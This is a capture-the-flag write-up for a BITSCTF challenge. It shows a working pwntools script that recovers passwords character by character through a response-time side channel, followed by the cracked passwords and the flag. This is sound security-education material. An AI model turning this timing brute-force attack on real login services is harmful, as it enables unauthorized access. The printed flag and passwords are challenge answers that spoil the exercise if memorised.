# Mogambro's uncertainity principle

Challenge description gives as follow

```MogamBro's Certainty Principle states that the more accurate you are the more delay you'll face. Δt • Δp ≥ frustration / ram_space; where p is precission and t is time.```

We are given only the netcat connection, so connecting we get this result

```
$ nc 20.244.33.146 4445
Enter password: h    
Incorrect password
Time taken:  9.888255534974642e-05
```

We are given an arbitary time taken value for a password character. After a lot of testing, wrote a script to bruteforce all ascii characters for the password. We are able to see that if the character at that position is given then the time taken value is the highest. So i wrote a script to bruteforce all characters and keep on adding them.

After you keep bruteforcing you will finally get the passwords and after level 5 you get the flag

```
nc 20.244.33.146 4445
Enter password: sloppytoppywithatwist
Congratulations! You have unlocked the door to level 2!
Enter password: gingerdangerhermoinegranger
Congratulations! You have unlocked the door to level 3!
Enter password: hickerydickerydockskibididobdobpop
Congratulations! You have unlocked the door to level 4!
Enter password: snickersnortsupersecureshortshakingsafarisadistic
Congratulations! You have unlocked the door to level 5!
Enter password: boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartpoop
Congratulations! You have unlocked all the doors. THe flag is BITSCTF{c0n6r47ul4710n5_0n_7h3_5ucc355ful_3n7ry}
```

Full script

```python
from pwn import context, remote
from multiprocessing import Process, Manager, Value
import ctypes

context.log_level = "ERROR"

# alphabets = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ_"
alphabets = "abcdefghijklmnopqrstuvwxyz"


def runner(passwords, timeTakens, curPass, currentChar):
    r = remote("20.244.33.146", 4445)

    for p in passwords:
        # print(p)
        r.sendlineafter(b"Enter password: ", p)

    to_send = curPass.value + currentChar.encode()

    try:
        r.sendlineafter(b"Enter password: ", to_send)
    except EOFError:
        print("EOFError")
        return

    output = r.recvline().decode()
    # print(output)
    if "congrat" in output.lower():
        if "BITSCTF" in output:
            print("\n\nGOT FLAG:", output.lower())
            # exit() # exit () doesn't work if inside process

        print("\n\nCRACKED LEVEL", to_send)
        passwords.append(to_send)
        curPass.value = b""
        r.close()
        return

    p = r.recvline().decode().strip()
    # print(to_send, p)
    timeTakens[currentChar] = float(p.split("Time taken: ")[-1])

    r.close()


passwords_init = [
    b"sloppytoppywithatwist",
    b"gingerdangerhermoinegranger",
    b"hickerydickerydockskibididobdobpop",
    b"snickersnortsupersecureshortshakingsafarisadistic",
]

curPass_init = "boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartp"
# curPass_init = ""

manager = Manager()
passwords = manager.list()

p_len = len(passwords_init)

for p in passwords_init:
    passwords.append(p)

curPass = Value(ctypes.c_char_p, curPass_init.encode())

while True:
    procs = []

    timeTakens = manager.dict()

    for alphabet in alphabets:
        proc = Process(target=runner, args=(passwords, timeTakens, curPass, alphabet))
        procs.append(proc)
        proc.start()

    for proc in procs:
        proc.join()

    # print(timeTakens)

    if len(passwords) == p_len:
        try:
            correct_letter = timeTakens.keys()[
                timeTakens.values().index(max(timeTakens.values()))
            ]
            # print(correct_letter)

            curPass.value += correct_letter.encode()
        except ValueError:
            print("got flag")
            exit()
    else:
        p_len = len(passwords)
        print(passwords)

    print(curPass.value)

    # break
```